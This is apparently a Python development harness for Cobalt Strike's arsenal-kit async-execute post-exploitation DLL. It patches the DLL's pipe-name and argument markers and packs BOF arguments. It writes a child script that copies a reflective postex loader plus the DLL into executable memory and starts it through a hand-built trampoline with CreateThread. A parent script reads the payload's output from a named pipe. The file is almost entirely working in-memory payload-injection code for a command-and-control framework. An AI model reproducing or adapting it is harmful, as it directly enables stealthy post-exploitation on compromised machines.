# -*- coding: utf-8 -*-
"""kit_local_harness2.py - C-27 true-contract validation of the official
arsenal-kit async-execute DLL, decoded from the kit SOURCE (base/dllmain.cpp,
utils.h, artifacts/async-execute/async-execute.cna):

  1. gPostexArgumentsBuffer marker "_POSTEX_ARGUMENTS_" (20B) receives the
     POSTEX_ARGUMENTS struct ONLY (no args appended - C-24's concatenation
     was our own dialect).
  2. The packed user args blob rides the THREAD PARAMETER (loader r15 ->
     DllMain lpReserved).
  3. The bof wire keeps the bof_extract CommandBuilder prefix; strip ONLY
     the trailing 4-byte argsLen and append the real one.

Success = the kit BOF's output chunks arrive on the patched pipe."""
import ctypes
import os
import struct
import subprocess
import sys
import time
from ctypes import wintypes

CTRL = r"\\.\pipe\kit_ctrl2"
KIT = r"C:\Users\Public\kit_async.x64.dll"
LOADER = r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-ts\p3-llvm-bench\src\main\resources\resources\postex-loader.x64.bin"

PIPEMARK = b"POST_EX_PIPE_NAME_PLEASE_DO_NOT_CHANGE_OR_REMOVE"
FULLPIPE_MARK = b"\\\\.\\pipe\\" + PIPEMARK
ARGSMARK = b"_POSTEX_ARGUMENTS_"

FULL = bytes.fromhex(open(r"C:\Users\Public\bt_hello_wire.hex").read().strip())


def L(b):
    return struct.pack(">i", len(b)) + b


# bt_hello_wire.hex (C-24 artifact) = [8B CB head][380B body ending at
# entry], final argsLen missing. 4.12 dialect probe: the official kit cna
# strips only 4 - consistent with a bof_extract output that has NO 8-byte
# CommandBuilder prefix (removed in 4.10+). Test both forms:
#   KIT_WIRE_MODE=prefix -> FULL + argsLen(0)  (with CB head)
#   otherwise           -> FULL[8:] + argsLen(0) (headless, official shape)
import os as _os
if _os.environ.get("KIT_WIRE_MODE") == "prefix":
    WIRE_KIT = FULL + struct.pack(">i", 0)
else:
    WIRE_KIT = FULL[8:] + struct.pack(">i", 0)

# packed user args (first-shot iiizzb): runOnce=1 alloc=2(VirtualAlloc)
# syscall=1(indirect) threadStart="ntdll.dll!RtlUserThreadStart+0x21"
# output_pipe=CTRL bof=WIRE_KIT  (values per official get_alloc_type/
# get_thread_start - MapViewOfFile=0 HeapAlloc=1 VirtualAlloc=2)
ARGS = (struct.pack(">i", 1) + struct.pack(">i", 2) + struct.pack(">i", 1)
        + L(b"ntdll.dll!RtlUserThreadStart+0x21\x00") + L(CTRL.encode() + b"\x00") + L(WIRE_KIT))


def patch_kit(data):
    d = bytearray(data)
    n0 = len(d)
    i = bytes(d).find(FULLPIPE_MARK)
    assert i > 0, "pipe marker"
    name = CTRL.encode() + b"\x00"
    name = name + b"\x00" * (len(FULLPIPE_MARK) - len(name))
    d[i:i + len(FULLPIPE_MARK)] = name
    i = bytes(d).find(ARGSMARK)
    assert i > 0, "args marker"
    # ExitFunc MUST be EXITFUNC_THREAD (0x0A2A1DE0): our postex-loader
    # SELF-FREES after DllMain returns (4.9.1 cleanupPostEx) - an ExitFunc
    # of 1 makes PostexExit RETURN into the freed loader blob and the
    # thread dies at blob+0x1f2 (cdb: EXECUTE c0000005 on MEM_FREE, same
    # offset every run). THREAD keeps the thread dying inside the kit.
    # bg-mode never reaches PostexExit (server loop), so THREAD is safe
    # for both modes.
    hdr = (struct.pack("<i", 0x0A2A1DE0) + b"AAAA" + b"N" + b"\x00\x00\x00"
           + struct.pack("<i", 1 << 20) + struct.pack("<i", len(ARGS)))
    assert len(hdr) == 20
    d[i:i + 20] = hdr
    assert len(d) == n0
    return bytes(d)


CHILD = r"C:\Users\Public\kit2_child.py"
_CHILD_SRC_PLACEHOLDER = (r'''
import ctypes, struct, sys, time, os
from ctypes import wintypes
sys.path.insert(0, r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-beacon\feat-post-4.9.1\tools")
from kit_local_harness2 import patch_kit, ARGS
k32 = ctypes.windll.kernel32
k32.VirtualAlloc.restype = ctypes.c_void_p
k32.VirtualAlloc.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
k32.CreateThread.restype = wintypes.HANDLE
dll = patch_kit(open(r"C:\Users\Public\kit_async.x64.dll", "rb").read())
loader = open(r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-ts\p3-llvm-bench\src\main\resources\resources\postex-loader.x64.bin", "rb").read()
blob = loader + dll
base = k32.VirtualAlloc(None, len(blob), 0x3000, 0x40)
ctypes.memmove(base, blob, len(blob))
argbase = k32.VirtualAlloc(None, len(ARGS), 0x3000, 0x04)
ctypes.memmove(argbase, ARGS, len(ARGS))
# r9 trampoline (deterministic startNamedPipe=1, same as the beacon chain):
# mov r9d,1 ; jmp rel32 -> loader entry. Without it r9 rides whatever the
# CreateThread stub left behind - r9=0 means NO pipe server and every
# BeaconOutput chunk dies on WriteFile(INVALID_HANDLE_VALUE).
tramp = k32.VirtualAlloc(None, 0x1000, 0x3000, 0x40)
code = bytearray(11)
code[0] = 0x41; code[1] = 0xB9; code[2:6] = struct.pack("<I", 1)   # mov r9d, 1
code[6] = 0xE9                                                      # jmp rel32
rel = base - (tramp + 11)
code[7:11] = struct.pack("<i", rel)
ctypes.memmove(tramp, bytes(code), 11)
print("pid", os.getpid(), "base", hex(base), "kit", len(dll), "args", len(ARGS), flush=True)
t = k32.CreateThread(None, 0, ctypes.cast(tramp, wintypes.LPVOID), ctypes.c_void_p(argbase), 0, None)
print("thread", t, flush=True)
time.sleep(60)
print("SURVIVED 60s", flush=True)
''')

PARENT = r"C:\Users\Public\kit2_parent.py"
_PARENT_SRC_PLACEHOLDER = (r'''
import time, struct, ctypes
from ctypes import wintypes
k32 = ctypes.windll.kernel32
k32.CreateFileW.restype = wintypes.HANDLE
GENERIC_RW = 0x80000000 | 0x40000000
OPEN_EXISTING = 3
CTRL = r"\\.\pipe\kit_ctrl2"

def open_pipe(name, timeout=20):
    t0 = time.time()
    while time.time() - t0 < timeout:
        h = k32.CreateFileW(name, GENERIC_RW, 0, None, OPEN_EXISTING, 0, None)
        if h and h != wintypes.HANDLE(-1).value:
            return h
        time.sleep(0.3)
    return None

h = open_pipe(CTRL)
print("pipe connected:", h is not None, flush=True)
if not h:
    raise SystemExit
out = b""
t0 = time.time()
while time.time() - t0 < 25:
    buf = ctypes.create_string_buffer(65536)
    got = wintypes.DWORD(0)
    if k32.ReadFile(h, buf, 65536, ctypes.byref(got), None) and got.value:
        chunk = buf.raw[:got.value]
        out += chunk
        printable = bytes(c if 32 <= c < 127 else 46 for c in chunk[:96])
        print("t+%.1fs RECV %d B: %s" % (time.time() - t0, got.value, printable.decode()), flush=True)
    else:
        time.sleep(0.3)
print("total:", len(out))
''')

# File writes happen ONLY on explicit main() - importing this module (as the
# gated experiment drivers and the child do) must NOT clobber the harness
# files other drivers just wrote (import-time side effects cost a full day:
# the child's import restored the STALE parent and every experiment silently
# tested the old code path).
def write_harness_files():
    open(CHILD, "w").write(_CHILD_SRC_PLACEHOLDER)
    open(PARENT, "w").write(_PARENT_SRC_PLACEHOLDER)


def main():
    write_harness_files()
    p = subprocess.Popen([sys.executable, "-I", CHILD], cwd=r"C:\Users\Public",
                         stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    time.sleep(2)
    p2 = subprocess.Popen([sys.executable, "-I", PARENT], cwd=r"C:\Users\Public",
                          stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    t0 = time.time()
    rc = None
    while time.time() - t0 < 50 and rc is None:
        rc = p.poll()
        time.sleep(1)
    if rc is None:
        p.kill()
    try:
        p2.wait(timeout=70)
    except Exception:
        p2.kill()
    print("=== CHILD ===")
    print(p.stdout.read().decode(errors="replace")[-2000:])
    print("=== PARENT ===")
    print(p2.stdout.read().decode(errors="replace")[-3000:])


if __name__ == "__main__":
    main()
